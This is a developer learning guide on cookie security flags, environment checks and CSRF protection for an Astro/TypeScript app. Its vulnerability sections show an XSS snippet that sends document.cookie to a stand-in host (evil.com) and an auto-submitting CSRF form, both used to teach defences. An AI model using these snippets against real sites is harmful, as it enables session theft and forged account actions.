# T210: Session Cookie Security Configuration - Learning Guide

**Educational Resource for Cookie Security Best Practices**

---

## Table of Contents
1. [Introduction](#introduction)
2. [Understanding HTTP Cookies](#understanding-http-cookies)
3. [Cookie Security Fundamentals](#cookie-security-fundamentals)
4. [The Problem We Solved](#the-problem-we-solved)
5. [Defense-in-Depth Approach](#defense-in-depth-approach)
6. [Implementation Deep Dive](#implementation-deep-dive)
7. [Security Levels Explained](#security-levels-explained)
8. [Common Cookie Vulnerabilities](#common-cookie-vulnerabilities)
9. [Best Practices](#best-practices)
10. [Practical Examples](#practical-examples)
11. [Testing Strategy](#testing-strategy)
12. [Further Reading](#further-reading)

---

## Introduction

This guide explains the cookie security implementation for T210, covering the fundamental concepts, security principles, and practical implementation details. Whether you're new to web security or an experienced developer, this guide will help you understand secure cookie management.

### Learning Objectives

By the end of this guide, you will understand:
- ✅ How HTTP cookies work and their security implications
- ✅ The importance of cookie security flags (Secure, HttpOnly, SameSite)
- ✅ Why defense-in-depth is critical for production systems
- ✅ How to implement different security levels for different operations
- ✅ Common cookie vulnerabilities and how to prevent them
- ✅ Best practices for session management

---

## Understanding HTTP Cookies

### What Are Cookies?

HTTP cookies are small pieces of data that a server sends to a user's web browser. The browser stores these cookies and sends them back with subsequent requests to the same server.

**Key Characteristics:**
- 📦 **Storage:** Stored in the browser
- 🔄 **Automatic:** Sent with every request to the same domain
- ⏰ **Expiration:** Can have expiration dates
- 🔒 **Scope:** Limited by domain and path

### Cookie Lifecycle

```
1. Server Response
   ↓
   Set-Cookie: session_id=abc123; Secure; HttpOnly; SameSite=Strict

2. Browser Storage
   ↓
   Cookie stored in browser's cookie jar

3. Subsequent Requests
   ↓
   Cookie: session_id=abc123

4. Server Reads Cookie
   ↓
   Authenticates user, maintains session
```

### Cookie Anatomy

```
Set-Cookie: name=value; attribute1; attribute2; attribute3
```

**Example:**
```
Set-Cookie: sid=xyz789; Secure; HttpOnly; SameSite=Strict; Path=/; Max-Age=86400
```

**Components:**
- **name=value**: The actual data (e.g., `sid=xyz789`)
- **Secure**: Only send over HTTPS
- **HttpOnly**: JavaScript cannot access
- **SameSite**: CSRF protection
- **Path**: Cookie scope
- **Max-Age**: Expiration time in seconds

---

## Cookie Security Fundamentals

### The Three Pillars of Cookie Security

#### 1. **Secure Flag** 🔐

**Purpose:** Ensures cookies are only transmitted over HTTPS

**Without Secure:**
```
User → [HTTP] → Server
      ↑
  Attacker can intercept cookie (session hijacking)
```

**With Secure:**
```
User → [HTTPS - Encrypted] → Server
      ↑
  Attacker sees encrypted data (cookie protected)
```

**Code:**
```typescript
cookies.set('session_id', 'abc123', {
  secure: true,  // ✅ Only sent over HTTPS
});
```

**Vulnerability Prevented:** Man-in-the-Middle (MITM) attacks

---

#### 2. **HttpOnly Flag** 🚫

**Purpose:** Prevents JavaScript from accessing the cookie

**Without HttpOnly:**
```javascript
// Attacker's XSS script
const cookie = document.cookie;  // ❌ Can steal session
fetch('https://evil.com/steal?cookie=' + cookie);
```

**With HttpOnly:**
```javascript
// Attacker's XSS script
const cookie = document.cookie;  // ✅ Returns empty (httpOnly cookies hidden)
```

**Code:**
```typescript
cookies.set('session_id', 'abc123', {
  httpOnly: true,  // ✅ JavaScript cannot access
});
```

**Vulnerability Prevented:** Cross-Site Scripting (XSS) cookie theft

---

#### 3. **SameSite Flag** 🛡️

**Purpose:** Controls when cookies are sent with cross-site requests

**Values:**
- **Strict**: Never send cookies on cross-site requests
- **Lax**: Send cookies on top-level navigation (GET requests)
- **None**: Always send cookies (requires Secure flag)

**Visual Example:**

```
User on evil.com
      ↓
  Click link to yoursite.com
      ↓
  SameSite=Strict → ❌ Cookie NOT sent (must re-authenticate)
  SameSite=Lax    → ✅ Cookie sent (better UX)
  SameSite=None   → ✅ Cookie sent (requires Secure)
```

**Code:**
```typescript
// Standard session (allows top-level navigation)
cookies.set('session_id', 'abc123', {
  sameSite: 'lax',  // ✅ Good UX, still protected
});

// Admin session (maximum protection)
cookies.set('admin_session', 'xyz789', {
  sameSite: 'strict',  // ✅ Maximum security
});
```

**Vulnerability Prevented:** Cross-Site Request Forgery (CSRF)

---

## The Problem We Solved

### Original Implementation (Vulnerable)

**Before T210:**
```typescript
// ❌ PROBLEM: Single point of failure
const SESSION_COOKIE_SECURE = process.env.NODE_ENV === 'production';

cookies.set(SESSION_COOKIE_NAME, sessionId, {
  httpOnly: true,
  secure: SESSION_COOKIE_SECURE,  // ❌ Only checks NODE_ENV
  sameSite: 'lax',
  maxAge: SESSION_TTL,
  path: '/',
});
```

### Why This Was Dangerous

**Scenario 1: Misconfigured Environment**
```bash
# Deployed to production, but NODE_ENV not set correctly
NODE_ENV=development  # ❌ Oops!

# Result:
# - Cookies sent over HTTP (not secure)
# - Session tokens transmitted in plaintext
# - Vulnerable to interception
```

**Scenario 2: CI/CD Pipeline Override**
```yaml
# CI/CD pipeline accidentally sets wrong env
env:
  NODE_ENV: staging  # ❌ Not "production"

# Result:
# - Production site with insecure cookies
# - No error thrown
# - Silent security failure
```

**Scenario 3: No Admin Protection**
```typescript
// Admin and regular users same security
login(cookies, userId, email, name, 'admin');  // ❌ No special handling
```

### Attack Vectors Enabled

1. **Session Hijacking**: Attacker intercepts cookie over HTTP
2. **CSRF Attacks**: Admin actions vulnerable to cross-site requests
3. **Environment Confusion**: Staging/production confusion leads to insecure cookies

---

## Defense-in-Depth Approach

### What is Defense-in-Depth?

**Definition:** Multiple layers of security controls, so if one fails, others provide protection.

**Analogy:** A castle has:
- 🏰 Outer walls (first defense)
- 🚪 Moat (second defense)
- 🔒 Inner keep (third defense)
- 👮 Guards (fourth defense)

**Cookie Security Layers:**
1. **Environment Detection** (multiple checks)
2. **Security Flags** (Secure, HttpOnly, SameSite)
3. **Validation** (throws errors if insecure)
4. **Security Levels** (admin vs standard)

### Multiple Production Checks

**Our Implementation:**
```typescript
export function isProduction(): boolean {
  return (
    process.env.NODE_ENV === 'production' ||      // Layer 1: Traditional
    process.env.VERCEL_ENV === 'production' ||    // Layer 2: Vercel
    process.env.NETLIFY === 'true' ||             // Layer 3: Netlify
    process.env.CF_PAGES === '1' ||               // Layer 4: Cloudflare
    (typeof window !== 'undefined' &&             // Layer 5: Browser
      (window.location.hostname.includes('production') ||
        !window.location.hostname.includes('localhost')))
  );
}
```

**Why This Works:**

| Environment Variable | Platform | Fallback If Missing |
|---------------------|----------|---------------------|
| NODE_ENV | Generic Node.js | ✅ Other checks |
| VERCEL_ENV | Vercel | ✅ Other checks |
| NETLIFY | Netlify | ✅ Other checks |
| CF_PAGES | Cloudflare Pages | ✅ Other checks |
| window.location | Browser | ✅ Other checks |

**Result:** Even if NODE_ENV is wrong, other checks catch it!

---

## Implementation Deep Dive

### Architecture Overview

```
┌─────────────────────────────────────────┐
│     Centralized Configuration           │
│     /src/lib/cookieConfig.ts            │
├─────────────────────────────────────────┤
│ ┌─────────────────────────────────────┐ │
│ │   Production Detection               │ │
│ │   isProduction()                     │ │
│ └─────────────────────────────────────┘ │
│ ┌─────────────────────────────────────┐ │
│ │   Security Options Generators        │ │
│ │   - getSecureCookieOptions()         │ │
│ │   - getSessionCookieOptions()        │ │
│ │   - getCSRFCookieOptions()           │ │
│ │   - getTemporaryCookieOptions()      │ │
│ └─────────────────────────────────────┘ │
│ ┌─────────────────────────────────────┐ │
│ │   Validation                         │ │
│ │   validateCookieSecurity()           │ │
│ └─────────────────────────────────────┘ │
└─────────────────────────────────────────┘
         │              │              │
         ▼              ▼              ▼
    ┌────────┐    ┌────────┐    ┌──────────┐
    │Session │    │  CSRF  │    │ Other    │
    │Manager │    │Protection│  │ Cookies  │
    └────────┘    └────────┘    └──────────┘
```

### Core Functions Explained

#### 1. `getSecureCookieOptions(level)`

**Purpose:** Generate base security options for cookies

**Parameters:**
- `level`: `'standard'` or `'admin'`

**Returns:** Cookie options object

**How It Works:**
```typescript
export function getSecureCookieOptions(
  level: CookieSecurityLevel = 'standard'
): Partial<AstroCookieSetOptions> {
  const isProd = isProduction();
  const isSecure = isSecureConnection();

  return {
    httpOnly: true,                      // Always prevent XSS
    secure: isProd || isSecure,          // HTTPS in production
    path: '/',                           // Entire site
    sameSite: level === 'admin' ? 'strict' : 'lax',  // CSRF protection
  };
}
```

**Example Usage:**
```typescript
// Standard cookie (e.g., user session)
const standardOptions = getSecureCookieOptions('standard');
// Result: { httpOnly: true, secure: true, path: '/', sameSite: 'lax' }

// Admin cookie (e.g., admin session)
const adminOptions = getSecureCookieOptions('admin');
// Result: { httpOnly: true, secure: true, path: '/', sameSite: 'strict' }
```

---

#### 2. `getSessionCookieOptions(maxAge, isAdminSession)`

**Purpose:** Generate session-specific cookie options

**Parameters:**
- `maxAge`: Session lifetime in seconds
- `isAdminSession`: Boolean indicating admin session

**Returns:** Complete cookie options with TTL

**How It Works:**
```typescript
export function getSessionCookieOptions(
  maxAge: number,
  isAdminSession: boolean = false
): AstroCookieSetOptions {
  // Choose security level based on session type
  const level: CookieSecurityLevel = isAdminSession ? 'admin' : 'standard';

  return {
    ...getSecureCookieOptions(level),  // Spread base options
    maxAge,                             // Add TTL
  } as AstroCookieSetOptions;
}
```

**Example Usage:**
```typescript
// Regular user session (24 hours)
const userOptions = getSessionCookieOptions(86400, false);
// Result: { httpOnly: true, secure: true, sameSite: 'lax', maxAge: 86400 }

// Admin session (24 hours)
const adminOptions = getSessionCookieOptions(86400, true);
// Result: { httpOnly: true, secure: true, sameSite: 'strict', maxAge: 86400 }
```

---

#### 3. `validateCookieSecurity(options)`

**Purpose:** Validate cookie options and throw errors in production

**Parameters:**
- `options`: Cookie options object to validate

**Throws:** Error if insecure configuration in production

**How It Works:**
```typescript
export function validateCookieSecurity(
  options: Partial<AstroCookieSetOptions>
): void {
  // Skip validation in development
  if (!isProduction()) return;

  // Check httpOnly (warn, don't throw)
  if (!options.httpOnly) {
    console.warn('[COOKIE SECURITY] Warning: Cookie without httpOnly flag');
  }

  // Check SameSite=none specific case (more specific)
  if (options.sameSite === 'none' && !options.secure) {
    throw new Error(
      '[COOKIE SECURITY] CRITICAL: SameSite=None requires Secure flag'
    );
  }

  // Check secure flag (general)
  if (!options.secure) {
    throw new Error(
      '[COOKIE SECURITY] CRITICAL: Attempting to set insecure cookie in production!'
    );
  }
}
```

**Validation Flow:**
```
options
  │
  ▼
isProduction? ─── No ──→ Return (skip validation)
  │
  Yes
  │
  ▼
httpOnly? ─── No ──→ Console Warning
  │
  Yes
  │
  ▼
SameSite=none AND !secure? ─── Yes ──→ Throw Error
  │
  No
  │
  ▼
secure? ─── No ──→ Throw Error
  │
  Yes
  │
  ▼
✅ Valid
```

---

## Security Levels Explained

### Why Different Security Levels?

**Key Principle:** Not all operations require the same security level.

**Trade-offs:**
- **Higher Security** = Less UX convenience (stricter restrictions)
- **Lower Security** = Better UX (more permissive)

**Goal:** Balance security and usability based on risk level.

---

### Standard Level (SameSite=Lax)

**Use Cases:**
- Regular user sessions
- Shopping carts
- General authentication
- Non-sensitive operations

**Behavior:**
```
User on google.com
    │
    │ Clicks link to yoursite.com
    │
    ▼
yoursite.com
    │
    │ Cookie sent? ✅ YES (top-level GET navigation)
    │ User stays logged in ✅
    │
    ▼
User posts form from evil.com to yoursite.com
    │
    │ Cookie sent? ❌ NO (cross-site POST blocked)
    │ CSRF attack prevented ✅
```

**Configuration:**
```typescript
const options = getSecureCookieOptions('standard');
// sameSite: 'lax'
```

**User Experience:**
- ✅ User clicks email link → stays logged in
- ✅ User clicks search result → stays logged in
- ❌ Attacker posts form → NOT logged in (protected)

---

### Admin Level (SameSite=Strict)

**Use Cases:**
- Admin dashboard access
- Sensitive operations (delete user, change settings)
- Financial transactions
- Privileged actions

**Behavior:**
```
User on google.com
    │
    │ Clicks link to yoursite.com/admin
    │
    ▼
yoursite.com/admin
    │
    │ Cookie sent? ❌ NO (cross-site navigation blocked)
    │ User must re-authenticate ✅
    │
    ▼
User navigates within yoursite.com/admin
    │
    │ Cookie sent? ✅ YES (same-site navigation)
    │ User stays logged in ✅
```

**Configuration:**
```typescript
const options = getSecureCookieOptions('admin');
// sameSite: 'strict'
```

**User Experience:**
- ❌ User clicks email link → must re-login (security over UX)
- ✅ User navigates within admin panel → stays logged in
- ❌ Attacker tries ANY cross-site request → blocked

**Why Strict for Admin:**
1. **Higher Risk**: Admin actions can affect all users
2. **Privilege Escalation**: Attackers target admin accounts
3. **Compliance**: Some regulations require stricter admin protection
4. **Attack Surface**: Reduce opportunities for social engineering

---

### CSRF Tokens (HttpOnly=False)

**Special Case:** CSRF tokens need JavaScript access

**Why HttpOnly=False:**
```javascript
// Frontend needs to send CSRF token in AJAX requests
fetch('/api/delete-user', {
  method: 'POST',
  headers: {
    'X-CSRF-Token': getCsrfToken(),  // ✅ Needs to read cookie
    'Content-Type': 'application/json',
  },
  body: JSON.stringify({ userId: 123 }),
});
```

**Security Trade-off:**
- ❌ **Downside:** XSS can steal CSRF token
- ✅ **Upside:** Still requires both cookie AND header match
- ✅ **Mitigation:** CSRF token != session token (separate concerns)

**Double-Submit Cookie Pattern:**
```
1. Server sets CSRF cookie (httpOnly: false, secure: true)
2. Frontend reads CSRF cookie value
3. Frontend sends CSRF token in header
4. Server compares: cookie value === header value
5. Attacker cannot read cookie (Same-Origin Policy)
6. CSRF attack prevented ✅
```

---

## Common Cookie Vulnerabilities

### 1. Session Hijacking (MITM Attack)

**Attack Scenario:**
```
User → [HTTP - Unencrypted] → Server
  ↑
Attacker intercepts:
  Cookie: session_id=abc123
  ↓
Attacker → Uses stolen cookie → Server
  ↓
Attacker gains access ❌
```

**Prevention:**
```typescript
cookies.set('session_id', 'abc123', {
  secure: true,  // ✅ Force HTTPS
});
```

**Result:** Cookie only sent over encrypted connection

---

### 2. XSS Cookie Theft

**Attack Scenario:**
```html
<!-- Attacker injects malicious script -->
<script>
  // Steal all cookies
  fetch('https://evil.com/steal?c=' + document.cookie);
</script>
```

**Prevention:**
```typescript
cookies.set('session_id', 'abc123', {
  httpOnly: true,  // ✅ JavaScript cannot access
});
```

**Result:** `document.cookie` won't include httpOnly cookies

---

### 3. CSRF Attack

**Attack Scenario:**
```html
<!-- Attacker's malicious site -->
<form action="https://yoursite.com/delete-account" method="POST">
  <input type="hidden" name="confirm" value="yes">
</form>
<script>document.forms[0].submit();</script>
```

**Without SameSite:**
```
User visits evil.com
    │
    │ Form auto-submits to yoursite.com
    │ Browser sends session cookie ❌
    │
    ▼
yoursite.com/delete-account
    │
    │ User authenticated (cookie sent)
    │ Account deleted ❌
```

**With SameSite:**
```typescript
cookies.set('session_id', 'abc123', {
  sameSite: 'lax',  // ✅ Block cross-site POST
});
```

**Result:** Cookie not sent with cross-site POST request

---

### 4. Subdomain Cookie Theft

**Attack Scenario:**
```
Attacker compromises subdomain:
  evil.yoursite.com
    │
    │ Sets cookie for .yoursite.com
    │ Cookie sent to www.yoursite.com ❌
    │
    ▼
  Session collision or theft
```

**Prevention:**
```typescript
cookies.set('session_id', 'abc123', {
  path: '/',              // Specific path
  domain: undefined,      // ✅ Don't set domain (stricter scope)
});
```

---

## Best Practices

### ✅ DO: Use Centralized Configuration

**Good:**
```typescript
// Centralized
import { getSessionCookieOptions } from '@/lib/cookieConfig';

cookies.set('sid', sessionId, getSessionCookieOptions(86400, false));
```

**Bad:**
```typescript
// Scattered configuration (hard to audit)
cookies.set('sid', sessionId, {
  httpOnly: true,
  secure: process.env.NODE_ENV === 'production',  // ❌ Error-prone
  sameSite: 'lax',
});
```

---

### ✅ DO: Validate Security in Production

**Good:**
```typescript
const options = getSessionCookieOptions(86400, isAdmin);
validateCookieSecurity(options);  // ✅ Throws error if insecure
cookies.set('sid', sessionId, options);
```

**Bad:**
```typescript
// No validation (silent failures)
cookies.set('sid', sessionId, {
  secure: false,  // ❌ Insecure in production (no error)
});
```

---

### ✅ DO: Use Strict SameSite for Admin

**Good:**
```typescript
// Admin login
const isAdminSession = role === 'admin';
setSessionCookie(cookies, sessionId, isAdminSession);
// → sameSite: 'strict' for admin
```

**Bad:**
```typescript
// Same security for all users
setSessionCookie(cookies, sessionId, false);
// → sameSite: 'lax' for admin ❌
```

---

### ✅ DO: Set Appropriate TTL

**Good:**
```typescript
// Short-lived sensitive cookies
getSessionCookieOptions(3600, true);  // 1 hour for admin

// Longer-lived convenience cookies
getSessionCookieOptions(86400, false);  // 24 hours for users
```

**Bad:**
```typescript
// Never expires (security risk)
cookies.set('sid', sessionId, {
  maxAge: 999999999,  // ❌ Years-long session
});
```

---

### ❌ DON'T: Store Sensitive Data in Cookies

**Bad:**
```typescript
// ❌ Never store sensitive data in cookies
cookies.set('credit_card', '1234-5678-9012-3456');
cookies.set('password', 'mypassword123');
cookies.set('ssn', '123-45-6789');
```

**Good:**
```typescript
// ✅ Store only session ID, keep data server-side
cookies.set('sid', sessionId, getSessionCookieOptions(86400, false));

// Server-side session storage (Redis)
await setJSON(`session:${sessionId}`, {
  userId: '123',
  email: 'user@example.com',
  // All sensitive data stored securely
});
```

---

## Practical Examples

### Example 1: User Login

```typescript
// User submits login form
export const POST: APIRoute = async ({ request, cookies }) => {
  const formData = await request.formData();
  const email = formData.get('email') as string;
  const password = formData.get('password') as string;

  // Verify credentials
  const user = await verifyCredentials(email, password);
  if (!user) {
    return new Response('Invalid credentials', { status: 401 });
  }

  // Create session with appropriate security level
  const sessionId = await createSession(
    user.id,
    user.email,
    user.name,
    user.role  // 'admin' or 'user'
  );

  // Set secure cookie (admin gets SameSite=strict)
  const isAdminSession = user.role === 'admin';
  setSessionCookie(cookies, sessionId, isAdminSession);

  return new Response(JSON.stringify({ success: true }), {
    status: 200,
    headers: { 'Content-Type': 'application/json' },
  });
};
```

**What Happens:**
1. User submits credentials
2. Server verifies user
3. Session created in Redis
4. Cookie set with appropriate security:
   - Admin user → `SameSite=strict` (maximum security)
   - Regular user → `SameSite=lax` (balanced)
5. Cookie always secure in production (multiple checks)

---

### Example 2: CSRF Protected Endpoint

```typescript
// Delete user endpoint (requires CSRF protection)
export const POST: APIRoute = async (context) => {
  const { request, cookies } = context;

  // Validate CSRF token
  const csrfValid = await validateCSRF(context);
  if (!csrfValid) {
    return new Response(JSON.stringify({ error: 'CSRF validation failed' }), {
      status: 403,
    });
  }

  // Verify admin session
  const session = await getSessionFromRequest(cookies);
  if (session?.role !== 'admin') {
    return new Response('Unauthorized', { status: 403 });
  }

  // Perform sensitive operation
  const { userId } = await request.json();
  await deleteUser(userId);

  return new Response(JSON.stringify({ success: true }));
};
```

**Security Layers:**
1. ✅ CSRF token validation (prevents cross-site attacks)
2. ✅ Session authentication (user must be logged in)
3. ✅ Role authorization (must be admin)
4. ✅ Admin cookie has `SameSite=strict` (maximum protection)

---

### Example 3: Rendering Forms with CSRF

```astro
---
// Page with state-changing form
import { getCSRFToken } from '@/lib/csrf';

const csrfToken = getCSRFToken(Astro.cookies);
---

<form method="POST" action="/api/delete-user">
  <input type="hidden" name="csrf_token" value={csrfToken} />
  <input type="text" name="userId" placeholder="User ID" />
  <button type="submit">Delete User</button>
</form>
```

**Frontend JavaScript (AJAX):**
```javascript
// Get CSRF token from cookie
const csrfToken = document.cookie
  .split('; ')
  .find(row => row.startsWith('csrf_token='))
  ?.split('=')[1];

// Send AJAX request with CSRF token
fetch('/api/delete-user', {
  method: 'POST',
  headers: {
    'X-CSRF-Token': csrfToken,  // CSRF token in header
    'Content-Type': 'application/json',
  },
  body: JSON.stringify({ userId: 123 }),
});
```

---

## Testing Strategy

### Unit Tests Structure

**Test Organization:**
```typescript
describe('Cookie Security Configuration', () => {
  describe('Production Detection', () => {
    it('should detect production from NODE_ENV', () => {});
    it('should detect production from VERCEL_ENV', () => {});
    // ... more environment tests
  });

  describe('Security Options', () => {
    it('should return standard security options', () => {});
    it('should use strict SameSite for admin', () => {});
    // ... more option tests
  });

  describe('Validation', () => {
    it('should throw error for insecure cookies in production', () => {});
    it('should allow insecure cookies in development', () => {});
    // ... more validation tests
  });
});
```

### Testing Best Practices

**1. Test Environment Isolation**
```typescript
beforeEach(() => {
  // Save original environment
  originalEnv = { ...process.env };
});

afterEach(() => {
  // Restore environment
  process.env = originalEnv;
});
```

**2. Test All Security Scenarios**
- ✅ Production detection (all indicators)
- ✅ Development behavior
- ✅ Security validation (pass and fail cases)
- ✅ Admin vs standard differences
- ✅ Edge cases (SameSite=none, missing flags)

**3. Verify Error Messages**
```typescript
expect(() => validateCookieSecurity(options)).toThrow(
  'SameSite=None requires Secure flag'
);
```

---

## Further Reading

### Official Documentation
- [OWASP Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)
- [MDN: Using HTTP Cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies)
- [RFC 6265: HTTP State Management Mechanism](https://tools.ietf.org/html/rfc6265)

### Security Resources
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [SameSite Cookie Explained](https://web.dev/samesite-cookies-explained/)
- [Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)

### Implementation Guides
- [Express Cookie Security](https://expressjs.com/en/advanced/best-practice-security.html)
- [Astro Cookies API](https://docs.astro.build/en/reference/api-reference/#astrocookies)

---

## Summary

### Key Takeaways

1. **Defense-in-Depth**: Never rely on a single security check
2. **Security Flags**: Always use Secure, HttpOnly, and SameSite
3. **Context Matters**: Admin operations need stricter security
4. **Validation**: Throw errors in production for insecure configurations
5. **Centralization**: Single source of truth for cookie security

### Security Checklist

- ✅ Cookies always secure in production
- ✅ HttpOnly for session cookies (XSS protection)
- ✅ SameSite for CSRF protection
- ✅ Admin sessions use stricter settings
- ✅ Multiple production environment checks
- ✅ Validation with error throwing
- ✅ Appropriate TTL values
- ✅ No sensitive data in cookies

### What You've Learned

You now understand:
- ✅ How cookies work and their security implications
- ✅ The importance of Secure, HttpOnly, and SameSite flags
- ✅ Why defense-in-depth is critical
- ✅ How to implement different security levels
- ✅ Common vulnerabilities and prevention
- ✅ Best practices for production systems

**Continue Learning:** Security is an ongoing process. Stay updated on new vulnerabilities and best practices!

---

**End of Guide**

*For questions or clarifications, refer to the implementation log and test documentation.*
